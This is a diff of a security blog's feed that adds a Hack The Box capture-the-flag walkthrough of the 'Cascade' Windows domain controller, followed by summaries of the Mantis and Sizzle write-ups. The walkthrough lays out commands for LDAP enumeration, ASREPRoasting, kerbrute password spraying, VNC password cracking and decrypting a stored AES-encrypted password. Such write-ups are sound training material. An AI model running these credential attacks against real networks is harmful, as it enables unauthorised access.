@@ -1,4 +1,368 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-07T00:30:18+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="https://omnisl4sh.github.io/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/06/Mantis</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/06/Mantis.html"><![CDATA[<h3 id="summary">Summary</h3>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-05-07T21:08:18+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="http://localhost:4000/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/07/Cascade</id><content type="html" xml:base="http://localhost:4000/2022/05/07/Cascade.html"><![CDATA[<h3 id="summary">Summary</h3>
+<ul>
+  <li><em>Noticing the open ports</em>: <strong>DNS, Kerberos, LDAP &amp; SMB</strong>, we know we’re up against a <strong>Windows Domain Controller</strong>.</li>
+  <li><strong>LDAP Enumeration</strong> reveals a <em>base-64 encoded</em> password which was <em>embedded</em> in a unique <strong>Active Directory</strong> user attribute.</li>
+  <li>Decoding the password grants us access to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user who happens to have <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">data</code> <strong>SMB</strong> share.</li>
+  <li><em>Exploring the share,</em> we find a <code class="language-plaintext highlighter-rouge">VNC</code>-related <code class="language-plaintext highlighter-rouge">.reg</code> file which contains an encrypted password in hexadecimal format.</li>
+  <li>We also find an e-mail about a <em>deleted</em> user (<code class="language-plaintext highlighter-rouge">TempAdmin</code>) who has a similar password to the normal (admin) user.</li>
+  <li><em>After we crack the</em> <strong>VNC</strong> <em>password with a tool called</em> <code class="language-plaintext highlighter-rouge">vncpwd</code>, we gain access to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</li>
+  <li><em>While enumerating SMB access for</em> <code class="language-plaintext highlighter-rouge">s.smith</code>, we find that he has <code class="language-plaintext highlighter-rouge">read</code> access to the <code class="language-plaintext highlighter-rouge">audit</code> share.</li>
+  <li>The <code class="language-plaintext highlighter-rouge">audit</code> share contained an <code class="language-plaintext highlighter-rouge">sqlite3</code> database file. <em>When enumerating it,</em> we find an encrypted password for the <code class="language-plaintext highlighter-rouge">arksvc</code> user.</li>
+  <li>We also find two files <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">CasCrypto.dll</code> which we reverse to find the necessary information to decrypt the <code class="language-plaintext highlighter-rouge">arksvc</code> password.</li>
+  <li>We authenticate as the <code class="language-plaintext highlighter-rouge">arksvc</code> user and find that he’s a member of a special group: <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code>.</li>
+  <li><em>Combining this information with the e-mail contents,</em> we’re enticed to check the deleted AD users.</li>
+  <li><em>Using</em> <strong>PowerShell</strong> <em>to fetch the deleted users with all their properties,</em> we find the password for the <code class="language-plaintext highlighter-rouge">Administrator</code> account in a unique attribute of the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user. We use it to authenticate and we gain <strong>full access</strong> to the machine.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-06 11:02:19Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49170/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2022-05-06T11:03:13
+|_  start_date: 2022-05-06T10:54:20
+</code></pre></div></div>
+<p><strong>DNS + Kerberos + LDAP + SMB = Domain Controller :D</strong></p>
+
+<p><strong>WinRM</strong> = Shell Access maybe :)</p>
+
+<p><em>From</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>version detection and scripts:</em></p>
+<ul>
+  <li><strong>OS:</strong> Windows Server 2008 R2 SP1</li>
+  <li><strong>Domain Name:</strong> Cascade.local</li>
+  <li><strong>Host name:</strong> CASC-DC1</li>
+</ul>
+
+<h3 id="checkpoint-listing-possible-enumerationexploitation-paths">Checkpoint: Listing Possible Enumeration/Exploitation Paths</h3>
+<p><em>Having the port data,</em> we go over our <strong>game plan</strong>:</p>
+
+<p><img src="/assets/Cascade/ad-gameplan-map.jpg" alt="ad-gameplan-map" /></p>
+
+<h3 id="down-to-business-rpc">Down to business: RPC</h3>
+<p><code class="language-plaintext highlighter-rouge">enum4linux-ng</code> (https://github.com/cddmp/enum4linux-ng) is a really nice revamp of the old <code class="language-plaintext highlighter-rouge">enum4linux</code> tool.</p>
+
+<p>we run it using the <code class="language-plaintext highlighter-rouge">-A</code> switch as well as <code class="language-plaintext highlighter-rouge">-oY</code> to output into <strong>YAML format</strong>.</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">enum4linux-ng -A 10.10.10.182 -oY e4lng-output</code></p>
+
+<p>we get a bunch of cool stuff:</p>
+
+<ol>
+  <li>usernames</li>
+</ol>
+
+<p><img src="/assets/Cascade/e4lng-output-users.jpg" alt="e4lng-output-users" /></p>
+
+<ol>
+  <li>groups</li>
+</ol>
+
+<p><img src="/assets/Cascade/e4lng-output-groups.jpg" alt="e4lng-output-groups" /></p>
+
+<ol>
+  <li>password policy</li>
+</ol>
+
+<p><img src="/assets/Cascade/e4lng-output-pass-pol.jpg" alt="e4lng-output-pass-pol" /></p>
+
+<p>This is great! We have a userlist that we can use to do <strong>ASREPRoasting</strong> and we can do <strong>Password Spraying</strong> without locking anyone out.</p>
+
+<h3 id="time-saving-1-asreproasting">Time Saving #1: ASREPRoasting</h3>
+<p><em>To save time,</em> we’re going to do the <strong>ASREPRoast</strong> first because it’s a quick check and has a high chance of giving us creds (<em>if we crack the hash</em>).</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">GetNPUsers.py -dc-ip 10.10.10.182 -request -debug -usersfile users.txt cascade.local/</code></p>
+
+<p><strong>Note:</strong> <em>I generally prefer to use the</em> <code class="language-plaintext highlighter-rouge">-debug</code> <em>flag with everything. It can save me a lot of time in troubleshooting.</em></p>
+
+<p><img src="/assets/Cascade/asreproast-results.jpg" alt="asreproast-results" /></p>
+
+<p>We find no accounts that don’t require <strong>kerberoes preauthentication.</strong></p>
+
+<p>we also notice some accounts got another type of error: <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</code>. <em>more on those later :)</em></p>
+
+<h3 id="time-saving-2-password-spraying-in-the-background">Time Saving #2: Password Spraying in the background</h3>
+<p><em>Since the password policy contained no user lockout,</em> we’re good to go spraying :D</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">for i in $(cat /opt/Seclists/Passwords/Common-Credentials/500-worst-passwords.txt); do kerbrute passwordspray --dc 10.10.10.182 -d cascade.local users.txt $i | grep -oP '\[\+\].*'; done</code></p>
+
+<p>what this does:</p>
+
+<p>it will spray using common passwords and only show us the output if it catches something.</p>
+
+<p>This is <em>mainly</em> to avoid filling up the screen with junk.</p>
+
+<p>Note on the error we get when <strong>ASREPRoasting:</strong></p>
+
+<p><em>Upon spraying,</em> we know that the users that got the <code class="language-plaintext highlighter-rouge">KDC_ERR_CLIENT_REVOKED</code> were in fact locked out.</p>
+
+<p>Another benefit of the verbosity with <code class="language-plaintext highlighter-rouge">-v</code> :)</p>
+
+<p><img src="/assets/Cascade/locked-out-users.jpg" alt="locked-out-users" /></p>
+
+<h3 id="smb-enumeration">SMB Enumeration</h3>
+<p><em>While we leave our spray running,</em> we’re going to enumerate <strong>SMB shares</strong> using <code class="language-plaintext highlighter-rouge">crackmapexec</code></p>
+
+<p><img src="/assets/Cascade/crackmapexec-smb-enum.jpg" alt="crackmapexec-smb-enum" /></p>
+
+<p>Notice that we test with the <code class="language-plaintext highlighter-rouge">cascguest</code> user on the 3rd attempt.</p>
+
+<p>This is because it was there in the <code class="language-plaintext highlighter-rouge">enum4linux-ng</code> output.</p>
+
+<p><img src="/assets/Cascade/casc-guest.jpg" alt="casc-guest" /></p>
+
+<h3 id="ldap">LDAP</h3>
+<p>We’re going to enumerate <strong>LDAP</strong> and see if we can find something there.</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">ldapsearch -x -H ldap://10.10.10.182 -b 'dc=cascade,dc=local'</code></p>
+
+<p>The output was huge (6k+ lines). So we saved it to <code class="language-plaintext highlighter-rouge">ldap-output</code></p>
+
+<p><img src="/assets/Cascade/ldap-output-huge.jpg" alt="ldap-output-huge" /></p>
+
+<p>we’re going to use a <code class="language-plaintext highlighter-rouge">grep</code> with some <strong>Regex Kung Fu</strong> to get rid of any unnecessary information.</p>
+
+<p><strong>Regex:</strong> <code class="language-plaintext highlighter-rouge">^\w+:</code></p>
+
+<p><strong>English:</strong> Get us any line that starts (<code class="language-plaintext highlighter-rouge">^</code>) with a bunch of characters (<code class="language-plaintext highlighter-rouge">\w+</code>) followed by a semicolon (<code class="language-plaintext highlighter-rouge">:</code>).</p>
+
+<p>We then follow up with a <code class="language-plaintext highlighter-rouge">sort</code> using the <code class="language-plaintext highlighter-rouge">-u</code> flag to get <em>only the signicant attributes.</em></p>
+
+<p><img src="/assets/Cascade/regex-kung-fu.jpg" alt="regex-kung-fu" /></p>
+
+<p>100 lines is much better XD</p>
+
+<p><em>While sifting through the attributes,</em> we came across this:</p>
+
+<p><img src="/assets/Cascade/ldap-uniq-attrib.jpg" alt="ldap-uniq-attrib" /></p>
+
+<p><img src="/assets/Cascade/ldap-uniq-attrib-val.jpg" alt="ldap-uniq-attrib-val" /></p>
+
+<p><em>Since it has an</em> <code class="language-plaintext highlighter-rouge">=</code> <em>at the end,</em> we try to decode it using <code class="language-plaintext highlighter-rouge">base64 -d</code></p>
+
+<p><img src="/assets/Cascade/ldap-uniq-attrib-pass-decoded.jpg" alt="ldap-uniq-attrib-pass-decoded" /></p>
+
+<p>This attribute belonged to the <code class="language-plaintext highlighter-rouge">r.thompson</code> user.</p>
+
+<p>Authentication succeded with it. But we didn’t get code execution with <strong>WinRM</strong> :/</p>
+
+<p><img src="/assets/Cascade/ryan-creds-check.jpg" alt="ryan-creds-check" /></p>
+
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p><em>Applying the same strategy as before,</em> we’re going to <strong>kerberoast.</strong></p>
+
+<p><img src="/assets/Cascade/kerberoasting.jpg" alt="kerberoasting" /></p>
+
+<p>No results there.</p>
+
+<h3 id="smb-access-with-rthompson">SMB Access with <code class="language-plaintext highlighter-rouge">R.Thompson</code></h3>
+<p>We’re going to use a <code class="language-plaintext highlighter-rouge">crackmapexec</code> module called <code class="language-plaintext highlighter-rouge">spider_plus</code>.</p>
+
+<p>It essentially crawls the <code class="language-plaintext highlighter-rouge">SMB</code> share and returns a list of files that we have access to.</p>
+
+<p><img src="/assets/Cascade/cme-spider-plus.jpg" alt="cme-spider-plus" /></p>
+
+<p>Here’s what it found:</p>
+
+<p><img src="/assets/Cascade/cme-spider-plus-results.jpg" alt="cme-spider-plus-results" /></p>
+
+<p><em>In the</em> <code class="language-plaintext highlighter-rouge">Data</code> <em>share,</em> the contents of the <code class="language-plaintext highlighter-rouge">Meeting_Notes_June_2018.html</code> were interesting:</p>
+
+<p><img src="/assets/Cascade/email-contents.jpg" alt="email-contents" /></p>
+
+<p><em>According to the mail,</em> a user called <code class="language-plaintext highlighter-rouge">TempAdmin</code> which has the same password as the normal admin (<code class="language-plaintext highlighter-rouge">Administrator</code> <em>probably</em>) should be deleted at the end of 2018.</p>
+
+<p>We note this down and make sure to be on the lookout for any information regarding that user.</p>
+
+<p>When we look at the <code class="language-plaintext highlighter-rouge">ArkAdRecycleBin.log</code> we get a confirmation that the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user has in fact been deleted.</p>
+
+<p><img src="/assets/Cascade/ark-ad-recycle-bin.jpg" alt="ark-ad-recycle-bin" /></p>
+
+<p>We find something very intersting in the <code class="language-plaintext highlighter-rouge">VNC Install.reg</code> file:</p>
+
+<p><img src="/assets/Cascade/tight-vnc-password.jpg" alt="tight-vnc-password" /></p>
+
+<h3 id="cracking-vnc-passwords">Cracking VNC Passwords</h3>
+<p>We’re interested in cracking this <strong>VNC</strong> password and reusing it.</p>
+
+<p><em>Luckily,</em> a tool called <code class="language-plaintext highlighter-rouge">vncpwd</code> (https://github.com/jeroennijhof/vncpwd) can easily do that.</p>
+
+<p>we clone the repo using <code class="language-plaintext highlighter-rouge">git clone https://github.com/jeroennijhof/vncpwd</code> and follow up with a <code class="language-plaintext highlighter-rouge">make</code> command to build it.</p>
+
+<p>We then get the hex string, reverse it with <code class="language-plaintext highlighter-rouge">xxd</code> using the <code class="language-plaintext highlighter-rouge">-r</code> and <code class="language-plaintext highlighter-rouge">-p</code> flags and decrypt it.</p>
+
+<p><img src="/assets/Cascade/vnc-pwd-cracked.jpg" alt="vnc-pwd-cracked" /></p>
+
+<h3 id="password-reuse">Password Reuse</h3>
+<p><em>Having a new password</em> <code class="language-plaintext highlighter-rouge">sT333ve2</code>, we’re going to to spray it all over the domain users we’ve collected.</p>
+
+<p><img src="/assets/Cascade/steve-ad-user-owned.jpg" alt="steve-ad-user-owned" /></p>
+
+<p><em>As expected,</em> the password belonged to the <code class="language-plaintext highlighter-rouge">s.smith</code> user.</p>
+
+<p>He also has <strong>WinRM</strong> access :D</p>
+
+<p><img src="/assets/Cascade/steve-winrm-access.jpg" alt="steve-winrm-access" /></p>
+
+<p>The user flag is the only significant thing that we found using his shell access.</p>
+
+<p>Running <strong>WinPeas</strong> didn’t pick up anything either. So we took a step back to check his <strong>SMB</strong> access.</p>
+
+<h3 id="steves-smb-access-the-audit-share">Steve’s SMB access: The <code class="language-plaintext highlighter-rouge">Audit$</code> Share</h3>
+<p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code> with the <code class="language-plaintext highlighter-rouge">--shares</code> flag, we get the below:</p>
+
+<p><img src="/assets/Cascade/steve-smb-access.jpg" alt="steve-smb-access" /></p>
+
+<p>we mount the share with: <code class="language-plaintext highlighter-rouge">mount -t cifs -o 'username=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt</code></p>
+
+<p>and list the files with: <code class="language-plaintext highlighter-rouge">find /mnt -type f 2&gt;/dev/null</code></p>
+
+<p><img src="/assets/Cascade/mount-and-find.jpg" alt="mount-and-find" /></p>
+
+<p>Checking the <code class="language-plaintext highlighter-rouge">.bat</code> file, we find that the executable <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> runs with a database as an argument <code class="language-plaintext highlighter-rouge">"\\CASC-DC1\Audit$\DB\Audit.db"</code></p>
+
+<p><img src="/assets/Cascade/audit-bat-file.jpg" alt="audit-bat-file" /></p>
+
+<p><em>From the</em> <strong>SQLite</strong> <code class="language-plaintext highlighter-rouge">.dll</code> <em>files,</em> we infer that the <code class="language-plaintext highlighter-rouge">.db</code> file is of that type.</p>
+
+<p>We confirm that with <code class="language-plaintext highlighter-rouge">file</code>:</p>
+
+<p><img src="/assets/Cascade/check-out-the-db.jpg" alt="check-out-the-db" /></p>
+
+<h3 id="db-enumeration">DB Enumeration</h3>
+<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sqlite3</code> command-line utility to check out the database contents.</p>
+
+<ol>
+  <li>we list the tables with: <code class="language-plaintext highlighter-rouge">.tables</code></li>
+  <li>we get the schema using <code class="language-plaintext highlighter-rouge">.schema</code></li>
+  <li>we select everything from the <code class="language-plaintext highlighter-rouge">Ldap</code> table after noticing the <code class="language-plaintext highlighter-rouge">pwd</code> field.</li>
+  <li>no new data was found in <code class="language-plaintext highlighter-rouge">DeletedUserAudit</code> table.</li>
+  <li>same for the <code class="language-plaintext highlighter-rouge">Misc</code> table as well.</li>
+</ol>
+
+<p><img src="/assets/Cascade/sqlite-db-enumeration.jpg" alt="sqlite-db-enumeration" /></p>
+
+<p>The password we found in the <code class="language-plaintext highlighter-rouge">Ldap</code> table appears to be for the <code class="language-plaintext highlighter-rouge">ArkSvc</code> user.</p>
+
+<p>Decoding it as base-64 gives us strange output. It must be encrypted.</p>
+
+<p><img src="/assets/Cascade/ark-svc-b64-attempt.jpg" alt="ark-svc-b64-attempt" /></p>
+
+<h3 id="reversing-the-cascauditexe-and-dll-files">Reversing the <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">.dll</code> files</h3>
+<p><em>Since the</em> <code class="language-plaintext highlighter-rouge">.bat</code> <em>file showed the</em> <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> <em>processing the Audit database,</em> we’re interested to know how it works.</p>
+
+<p>The same goes for <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code>. <em>Judging by its name,</em> it’s very likely related to the encryption.</p>
+
+<p>Doing a <code class="language-plaintext highlighter-rouge">file</code> command against the <code class="language-plaintext highlighter-rouge">CascAudit</code> files tells us they are built with <code class="language-plaintext highlighter-rouge">.Net</code></p>
+
+<p><img src="/assets/Cascade/inspecting-cascaudit-files.jpg" alt="inspecting-cascaudit-files" /></p>
+
+<p><em>Because of an amazing tool called</em> <code class="language-plaintext highlighter-rouge">DNSpy</code> (https://github.com/dnSpy/dnSpy), reversing <code class="language-plaintext highlighter-rouge">.Net</code> is simple.</p>
+
+<p>Opening the <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> with <code class="language-plaintext highlighter-rouge">DNSpy.exe</code> shows two important functions: <code class="language-plaintext highlighter-rouge">EncryptString</code> and <code class="language-plaintext highlighter-rouge">DecryptString</code></p>
+
+<p><img src="/assets/Cascade/dnspy-casc-crypto-dll.jpg" alt="dnspy-casc-crypto-dll" /></p>
+
+<p>A great deal of information is present regarding the encryption:</p>
+<ol>
+  <li><strong>Type:</strong> AES</li>
+  <li><strong>Block Size:</strong> 128-bit</li>
+  <li><strong>Key Size:</strong> 128-bit</li>
+  <li><strong>Initialization Vector (IV):</strong> <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code></li>
+  <li><strong>Mode:</strong> CBC</li>
+</ol>
+
+<p>We need just the key to be able to decrypt the <code class="language-plaintext highlighter-rouge">ArkSvc</code> password found in the DB. Or so we hope :D</p>
+
+<p>We find the it in the <code class="language-plaintext highlighter-rouge">.exe</code> code</p>
+
+<p><img src="/assets/Cascade/dnspy-casc-exe.jpg" alt="dnspy-casc-exe" /></p>
+
+<p>it’s <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code></p>
+
+<p><em>Looking at the code,</em> it seems that the <code class="language-plaintext highlighter-rouge">.exe</code> reads the encrypted password from the database and decrypts it using the <code class="language-plaintext highlighter-rouge">DecryptString</code> function before moving on to carry out its tasks.</p>
+
+<h3 id="aes-cbc-128-decryption">AES-CBC-128 Decryption</h3>
+<p><em>Adding the details we found into an</em> <strong>online decryption tool</strong> (https://www.devglan.com/online-tools/aes-encryption-decryption), we get the plaintext: <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code></p>
+
+<p><img src="/assets/Cascade/aes-cbc-128-decryption.jpg" alt="aes-cbc-128-decryption" /></p>
+
+<h3 id="arksvc-and-the-ad-recycle-bin">ArkSvc and the AD Recycle Bin</h3>
+<p>The user <code class="language-plaintext highlighter-rouge">ArkSvc</code> authenticates successfully with the <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code> password and also has <code class="language-plaintext highlighter-rouge">WinRM</code> access.</p>
+
+<p><img src="/assets/Cascade/ark-svc-got-winrm.jpg" alt="ark-svc-got-winrm" /></p>
+
+<p><em>While doing some basic privesc checks</em>, we notice that the group membership of this user is unique:</p>
+
+<p><img src="/assets/Cascade/ark-svc-group-membership.jpg" alt="ark-svc-group-membership" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">s.smith</code> didn’t have this access.</p>
+
+<p><img src="/assets/Cascade/s-smith-group-membership.jpg" alt="s-smith-group-membership" /></p>
+
+<p>The <strong>Recycle Bin</strong> of <strong>Active Directory</strong> is important in our case because it contains the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>
+
+<p>We don’t know his password yet. But it might be similar to any of the ones we found.</p>
+
+<p>We try restoring him using <code class="language-plaintext highlighter-rouge">PowerShell</code></p>
+
+<p>The command has 3 parts:</p>
+<ol>
+  <li>Fetching all deleted objects: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects</code></li>
+  <li>Selecting the last one (TempAdmin): <code class="language-plaintext highlighter-rouge">Select -Last 1 </code></li>
+  <li>Restoring It: <code class="language-plaintext highlighter-rouge">Restore-ADObject</code></li>
+</ol>
+
+<p><img src="/assets/Cascade/attempting-tempadmin-restore.jpg" alt="attempting-tempadmin-restore" /></p>
+
+<p>But that fails :/</p>
+
+<p>I scratch my head for a while…</p>
+
+<p>But eventually get the idea of checking all the attributes for the <code class="language-plaintext highlighter-rouge">TempAdmin</code> user.</p>
+
+<p>Just in case his password was in one of them. Just like the <code class="language-plaintext highlighter-rouge">r.thompson</code> user or something.</p>
+
+<p>Command: <code class="language-plaintext highlighter-rouge">Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects -Properties * | Select -Last 1</code></p>
+
+<p><img src="/assets/Cascade/temp-admin-password.jpg" alt="temp-admin-password" /></p>
+
+<p>Son of a … It was indeed the case XD</p>
+
+<p><em>And of course,</em> it was base-64 encoded.</p>
+
+<p>We decode it and try it with the <code class="language-plaintext highlighter-rouge">Administrator</code> user as mentioned in the email:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username is TempAdmin (password is the same as the normal admin account password)
+</code></pre></div></div>
+
+<p><img src="/assets/Cascade/got-admin-at-last.jpg" alt="got-admin-at-last" /></p>
+
+<p>And we finally own the box after following all those breadcrumbs XD</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary Noticing the open ports: DNS, Kerberos, LDAP &amp; SMB, we know we’re up against a Windows Domain Controller. LDAP Enumeration reveals a base-64 encoded password which was embedded in a unique Active Directory user attribute. Decoding the password grants us access to the r.thompson user who happens to have read access to the data SMB share. Exploring the share, we find a VNC-related .reg file which contains an encrypted password in hexadecimal format. We also find an e-mail about a deleted user (TempAdmin) who has a similar password to the normal (admin) user. After we crack the VNC password with a tool called vncpwd, we gain access to the s.smith user. While enumerating SMB access for s.smith, we find that he has read access to the audit share. The audit share contained an sqlite3 database file. When enumerating it, we find an encrypted password for the arksvc user. We also find two files CascAudit.exe and CasCrypto.dll which we reverse to find the necessary information to decrypt the arksvc password. We authenticate as the arksvc user and find that he’s a member of a special group: AD Recycle Bin. Combining this information with the e-mail contents, we’re enticed to check the deleted AD users. Using PowerShell to fetch the deleted users with all their properties, we find the password for the Administrator account in a unique attribute of the TempAdmin user. We use it to authenticate and we gain full access to the machine.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)</title><link href="http://localhost:4000/2022/05/06/Mantis.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Mantis (AD Pentesting Track #8)" /><published>2022-05-06T00:00:00+02:00</published><updated>2022-05-06T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/06/Mantis</id><content type="html" xml:base="http://localhost:4000/2022/05/06/Mantis.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A <strong>Windows Domain Controller</strong> machine. We find a <em>hidden credentials file</em> when directory bruteforcing <strong>IIS</strong> on a <em>custom</em> port.</li>
   <li>The file gives us information about the <strong>MSSQL database</strong> (the username and DB name) in plain text while the password is present in the file name as a <em>base-64 encoded hex</em> string.</li>
@@ -343,7 +707,7 @@ Host script results:
 
 <p><img src="/assets/Mantis/pykek-for-the-win.jpg" alt="pykek-for-the-win" /></p>
 
-<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Windows Domain Controller machine. We find a hidden credentials file when directory bruteforcing IIS on a custom port. The file gives us information about the MSSQL database (the username and DB name) in plain text while the password is present in the file name as a base-64 encoded hex string. Using the credentials found, we gain access to the MSSQL database which contains the password for a user called james who is an AD user. With james’s credentials, we’re able to exploit Kerberos with a known CVE (MS14-068) a.k.a Pykek to forge a Domain Admin ticket. Using the ticket with kerberos authentication, we can execute commands on the box as a Domain Administrator to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="https://omnisl4sh.github.io/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/02/Sizzle</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/02/Sizzle.html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Sweeeet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Windows Domain Controller machine. We find a hidden credentials file when directory bruteforcing IIS on a custom port. The file gives us information about the MSSQL database (the username and DB name) in plain text while the password is present in the file name as a base-64 encoded hex string. Using the credentials found, we gain access to the MSSQL database which contains the password for a user called james who is an AD user. With james’s credentials, we’re able to exploit Kerberos with a known CVE (MS14-068) a.k.a Pykek to forge a Domain Admin ticket. Using the ticket with kerberos authentication, we can execute commands on the box as a Domain Administrator to gain full access.]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)</title><link href="http://localhost:4000/2022/05/02/Sizzle.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Insane] - Sizzle (AD Pentesting Track #7)" /><published>2022-05-02T00:00:00+02:00</published><updated>2022-05-02T00:00:00+02:00</updated><id>http://localhost:4000/2022/05/02/Sizzle</id><content type="html" xml:base="http://localhost:4000/2022/05/02/Sizzle.html"><![CDATA[<h3 id="summary">Summary</h3>
 <ul>
   <li>A <strong>Windows Domain Controller</strong> machine. We find an <strong>SMB share</strong> containing a <em>writable</em> folder called <code class="language-plaintext highlighter-rouge">Public</code>. We place an <code class="language-plaintext highlighter-rouge">SCF</code> file there that <em>directs the visiting user’s computer</em> to our listening <code class="language-plaintext highlighter-rouge">responder</code> where we capture his <code class="language-plaintext highlighter-rouge">NTLMv2</code> hash.</li>
   <li><em>After cracking it,</em> we get the password for the <code class="language-plaintext highlighter-rouge">amanda</code> user which we use to enumerate the domain using <code class="language-plaintext highlighter-rouge">BloodHound</code>.</li>
@@ -714,7 +1078,7 @@ Command=ToggleDesktop
 
 <p>OR…</p>
 
-<p><img src="/assets/Sizzle/zero-logon-XD.jpg" alt="zero-logon-XD" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[Summary A Windows Domain Controller machine. We find an SMB share containing a writable folder called Public. We place an SCF file there that directs the visiting user’s computer to our listening responder where we capture his NTLMv2 hash. After cracking it, we get the password for the amanda user which we use to enumerate the domain using BloodHound. Noticing that our user has PowerShell Remoting capabilities, we try to gain access but are faced with a strange authentication error. Upon inspecting the functionality of the Evil-Winrm tool, we find that we can use a certificate for logging in. We create a Certificate Signing Request using openssl and get it signed from the ADCS Web Interface found on the domain controller. Using evil-winrm‘s ability to authenticate using SSL certificates, we successfully achieve code execution. Looking back at the output of BloodHound showed a kerberoastable user called mrlky that has dangerous rights abusable for a DCSync attack. We decide to use Rubeus.exe to do the job but can’t execute it due to Applocker restrictions. We 